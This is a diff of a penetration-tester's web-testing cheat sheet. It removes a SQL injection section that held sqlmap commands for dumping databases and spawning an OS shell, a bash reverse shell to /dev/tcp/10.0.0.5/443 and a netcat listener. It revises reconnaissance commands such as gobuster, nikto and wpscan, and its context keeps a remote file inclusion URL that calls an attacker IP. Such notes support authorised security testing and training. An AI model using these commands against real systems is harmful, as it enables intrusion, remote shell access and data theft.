@@ -19,7 +19,6 @@ TRACE       Used for debugging
 200  OK
 301  Moved Permanently
 302  Found
-304  Not Modified
 400  Bad Request
 401  Unauthorized
 403  Forbidden
@@ -210,30 +209,7 @@ http://target.com/test.php?page=http://<attacker IP>/test.txt
 
 # SQL Injection
 
-Structured Query Language (SQL)
-Can be prevent by doing input validation, parameterized queries, stored procedures, and implementing a Web Application Firewall (WAF).
-
-Use Burp, turn the Proxy intercept on.
-Send a form request with no data using the browser.
-Capture the request, right-click on the POST > Copy to file: login.txt
-
-sqlmap.py -r login.txt --force-ssl --batch
-sqlmap.py -r login.txt --force-ssl --batch --dbs
-sqlmap.py -r login.txt --force-ssl --batch -D <database> --tables
-sqlmap.py -r login.txt --force-ssl --batch -D <database> -T <table> --dump
-sqlmap.py -r login.txt --force-ssl --batch --os-cmd whoami
-sqlmap.py -r login.txt --force-ssl --batch --os-cmd id
-sqlmap.py -r login.txt --force-ssl --batch --os-shell
-
-os-shell> bash -c "bash -i >& /dev/tcp/10.0.0.5/443 0>&1"
-
-- Kali
-nc -lvpn 443
-python3 -V
-python3 -c 'import pty;pty.spawn("bash")'
-ctrl Z
-stty raw -echo; fg
-cd ~
+Seee databases.txt
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # URL Encoding
@@ -317,24 +293,25 @@ sslscan --targets=targets.txt --ipv4 --show-certificate --ssl2 --ssl3 --tlsall -
 nmap -Pn -n -T4 --open -p443 --script-timeout 20s -sV --min-hostgroup 100 --script=rsa-vuln-roca,ssl*,tls-alpn,tls-ticketbleed -iL targets.txt
 
 - Default configurations and files
-nikto -h https://$url -Format htm --output nikto.htm
+nikto -h http://$url -Format htm --output nikto.htm
 
 - Brute force directories
-gobuster dir -w /usr/share/wordlists/dirb/common.txt -u <target IP>
-gobuster dir -w /opt/SecLists/Discovery/Web-Content/raft-small-directories.txt -u <target IP>
+Firefox <target IP>
+Use Wappalyzer plugin to see file types.
 If the website uses PHP, add -x php
 
-Create a custom wordlist
+gobuster dir -w /usr/share/wordlists/dirb/common.txt -x php,http -u <target IP>
+gobuster dir -w /opt/SecLists/Discovery/Web-Content/raft-small-directories.txt -x php,http -u <target IP>
+
+- Create a custom wordlist
 cewl --lowercase -e --email_file emails.txt -w dict.txt https://$url
 
 - Application specific enumeration
-davtest -url https://$url
-droopescan scan drupal -u https://$url
-ftp <target IP>
-     wget --mirror ftp://<user:password>@<target IP>
-joomscan -u https://$url
-uniscan -u https://www.$url -qweds
-wpscan --url https:/$url --enumerate vp,vt,cb,u,m
+davtest -url http://$url
+droopescan scan drupal -u http://$url
+joomscan -u http://$url
+uniscan -u http://www.$url -qweds
+wpscan --url http:/$url --enumerate vp,vt,cb,u,m
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Setup Burp Suite Pro
